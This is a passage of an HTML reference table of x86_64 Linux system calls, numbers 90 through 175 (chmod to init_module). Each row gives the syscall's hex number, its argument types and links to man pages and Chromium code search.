href="https://man7.org/linux/man-pages/man2/chmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chmod">cs/</a></td><td align="center">0x5a</td><td>const char *filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">91</td><td>fchmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td><td align="center">0x5b</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">92</td><td>chown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown">cs/</a></td><td align="center">0x5c</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">93</td><td>fchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td><td align="center">0x5d</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">94</td><td>lchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown">cs/</a></td><td align="center">0x5e</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">95</td><td>umask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td><td align="center">0x5f</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">96</td><td>gettimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td><td align="center">0x60</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">97</td><td>getrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrlimit">cs/</a></td><td align="center">0x61</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">98</td><td>getrusage</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td><td align="center">0x62</td><td>int who</td><td>struct rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">99</td><td>sysinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td><td align="center">0x63</td><td>struct sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">100</td><td>times</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td><td align="center">0x64</td><td>struct tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">101</td><td>ptrace</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td><td align="center">0x65</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td></tr><tr><td align="center">102</td><td>getuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td><td align="center">0x66</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">103</td><td>syslog</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td><td align="center">0x67</td><td>int type</td><td>char *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">104</td><td>getgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td><td align="center">0x68</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">105</td><td>setuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td><td align="center">0x69</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">106</td><td>setgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td><td align="center">0x6a</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">107</td><td>geteuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td><td align="center">0x6b</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">108</td><td>getegid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td><td align="center">0x6c</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">109</td><td>setpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td><td align="center">0x6d</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">110</td><td>getppid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td><td align="center">0x6e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">111</td><td>getpgrp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgrp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgrp">cs/</a></td><td align="center">0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">112</td><td>setsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td><td align="center">0x70</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">113</td><td>setreuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td><td align="center">0x71</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">114</td><td>setregid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td><td align="center">0x72</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">115</td><td>getgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td><td align="center">0x73</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">116</td><td>setgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td><td align="center">0x74</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">117</td><td>setresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td><td align="center">0x75</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">118</td><td>getresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td><td align="center">0x76</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">119</td><td>setresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td><td align="center">0x77</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">120</td><td>getresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td><td align="center">0x78</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">121</td><td>getpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td><td align="center">0x79</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">122</td><td>setfsuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td><td align="center">0x7a</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">123</td><td>setfsgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td><td align="center">0x7b</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">124</td><td>getsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td><td align="center">0x7c</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">125</td><td>capget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td><td align="center">0x7d</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">126</td><td>capset</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td><td align="center">0x7e</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">127</td><td>rt_sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td><td align="center">0x7f</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">128</td><td>rt_sigtimedwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td><td align="center">0x80</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct __kernel_timespec *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">129</td><td>rt_sigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td><td align="center">0x81</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">130</td><td>rt_sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td><td align="center">0x82</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">131</td><td>sigaltstack</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td><td align="center">0x83</td><td>const struct sigaltstack *uss</td><td>struct sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">132</td><td>utime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utime">cs/</a></td><td align="center">0x84</td><td>char *filename</td><td>struct utimbuf *times</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">133</td><td>mknod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknod">cs/</a></td><td align="center">0x85</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">134</td><td>uselib</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uselib.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uselib">cs/</a></td><td align="center">0x86</td><td>const char *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">135</td><td>personality</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td><td align="center">0x87</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">136</td><td>ustat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ustat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ustat">cs/</a></td><td align="center">0x88</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">137</td><td>statfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td><td align="center">0x89</td><td>const char * path</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">138</td><td>fstatfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td><td align="center">0x8a</td><td>unsigned int fd</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">139</td><td>sysfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysfs">cs/</a></td><td align="center">0x8b</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">140</td><td>getpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td><td align="center">0x8c</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">141</td><td>setpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td><td align="center">0x8d</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">142</td><td>sched_setparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td><td align="center">0x8e</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">143</td><td>sched_getparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td><td align="center">0x8f</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">144</td><td>sched_setscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td><td align="center">0x90</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">145</td><td>sched_getscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td><td align="center">0x91</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">146</td><td>sched_get_priority_max</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td><td align="center">0x92</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">147</td><td>sched_get_priority_min</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td><td align="center">0x93</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">148</td><td>sched_rr_get_interval</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td><td align="center">0x94</td><td>pid_t pid</td><td>struct __kernel_timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">149</td><td>mlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td><td align="center">0x95</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">150</td><td>munlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td><td align="center">0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">151</td><td>mlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td><td align="center">0x97</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">152</td><td>munlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td><td align="center">0x98</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">153</td><td>vhangup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td><td align="center">0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">154</td><td>modify_ldt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/modify_ldt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*modify_ldt">cs/</a></td><td align="center">0x9a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">155</td><td>pivot_root</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td><td align="center">0x9b</td><td>const char *new_root</td><td>const char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">156</td><td>_sysctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_sysctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_sysctl">cs/</a></td><td align="center">0x9c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">157</td><td>prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td><td align="center">0x9d</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">158</td><td>arch_prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/arch_prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arch_prctl">cs/</a></td><td align="center">0x9e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">159</td><td>adjtimex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td><td align="center">0x9f</td><td>struct __kernel_timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">160</td><td>setrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td><td align="center">0xa0</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">161</td><td>chroot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td><td align="center">0xa1</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">162</td><td>sync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td><td align="center">0xa2</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">163</td><td>acct</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td><td align="center">0xa3</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">164</td><td>settimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td><td align="center">0xa4</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">165</td><td>mount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td><td align="center">0xa5</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td>-</td></tr><tr><td align="center">166</td><td>umount2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td><td align="center">0xa6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">167</td><td>swapon</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td><td align="center">0xa7</td><td>const char *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">168</td><td>swapoff</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td><td align="center">0xa8</td><td>const char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">169</td><td>reboot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td><td align="center">0xa9</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td>-</td><td>-</td></tr><tr><td align="center">170</td><td>sethostname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td><td align="center">0xaa</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">171</td><td>setdomainname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td><td align="center">0xab</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">172</td><td>iopl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/iopl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*iopl">cs/</a></td><td align="center">0xac</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">173</td><td>ioperm</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioperm.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioperm">cs/</a></td><td align="center">0xad</td><td>unsigned long from</td><td>unsigned long num</td><td>int on</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">174</td><td>create_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/create_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*create_module">cs/</a></td><td align="center">0xae</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">175</td><td>init_module</td><td align="center"><a 